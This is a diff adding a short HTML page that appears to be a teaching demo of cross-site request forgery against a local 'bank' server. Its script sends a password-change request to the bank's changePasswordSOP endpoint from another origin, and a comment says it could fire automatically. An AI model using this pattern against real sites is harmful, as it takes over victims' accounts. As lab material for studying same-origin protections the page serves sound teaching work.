@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+    <script src="/javascripts/main.js"></script>
+    <script>
+        function doHack() {
+            doPost('http://bank:3002/changePasswordSOP', 'newPasswordThatOnlyHackerKnows',
+                function (res) {
+                    alert("Account has been hacked!");
+                }
+            )
+        }
+    </script>
+</head>
+<body>
+That script can just run automatically. Like in crsf example.
+<input type="button" onclick="doHack()" value="hack"/>
+</body>
+</html>
